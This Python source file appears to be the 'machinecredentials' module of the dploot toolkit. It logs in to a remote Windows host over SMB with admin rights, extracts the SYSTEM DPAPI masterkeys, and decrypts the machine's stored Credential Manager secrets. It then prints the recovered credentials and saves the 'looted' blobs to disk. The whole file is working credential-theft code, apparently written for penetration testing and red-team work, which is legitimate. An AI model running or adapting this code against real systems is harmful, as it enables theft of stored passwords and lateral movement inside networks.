import argparse
import logging
import os
import sys
from typing import Callable, Tuple

from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target, add_target_argument_group
from dploot.lib.utils import handle_outputdir_option, parse_file_as_list
from dploot.triage.credentials import CredentialsTriage
from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file


NAME = 'machinecredentials'

class MachineCredentialsAction:

    def __init__(self, options: argparse.Namespace) -> None:
        self.options = options

        self.target = Target.from_options(options)

        self.conn = None
        self._is_admin = None
        self.masterkeys = None
        self.outputdir = None

        self.outputdir = handle_outputdir_option(dir= self.options.export_cm)

        if self.options.mkfile is not None:
            try:
                self.masterkeys = parse_masterkey_file(self.options.mkfile)
            except Exception as e:
                logging.error(str(e))
                sys.exit(1)

    def connect(self) -> None:
        self.conn = DPLootSMBConnection(self.target)
        self.conn.connect()
    
    def run(self) -> None:
        self.connect()
        logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
        if self.is_admin:
            if self.masterkeys is None:
                triage = MasterkeysTriage(target=self.target, conn=self.conn)
                logging.info("Triage SYSTEM masterkeys\n")
                self.masterkeys = triage.triage_system_masterkeys()
                if not self.options.quiet: 
                    for masterkey in self.masterkeys:
                        masterkey.dump()
                    print()

            cred_triage = CredentialsTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
            logging.info('Triage SYSTEM Credentials\n')
            credentials = cred_triage.triage_system_credentials()
            for credential in credentials:
                if self.options.quiet:
                    credential.dump_quiet()
                else:
                    credential.dump()
            if self.outputdir is not None:
                for filename, bytes in cred_triage.looted_files.items():
                    with open(os.path.join(self.outputdir, filename),'wb') as outputfile:
                        outputfile.write(bytes)
            
        else:
            logging.info("Not an admin, exiting...")

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin

def entry(options: argparse.Namespace) -> None:
    a = MachineCredentialsAction(options)
    a.run()

def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:

    subparser = subparsers.add_parser(NAME, help="Dump system credentials from remote target")

    group = subparser.add_argument_group("machinecredentials options")

    group.add_argument(
        "-mkfile",
        action="store",
        help=(
            "File containing {GUID}:SHA1 masterkeys mappings"
        ),
    )

    group.add_argument(
        "-outputfile",
        action="store",
        help=(
            "Export keys to file"
        ),
    )

    group.add_argument(
        "-export-cm",
        action="store",
        metavar="DIR_CREDMAN",
        help=(
            "Dump looted Credential Manager blob to specified directory, regardless they were decrypted"
        )
    )

    add_target_argument_group(subparser)

    return NAME, entry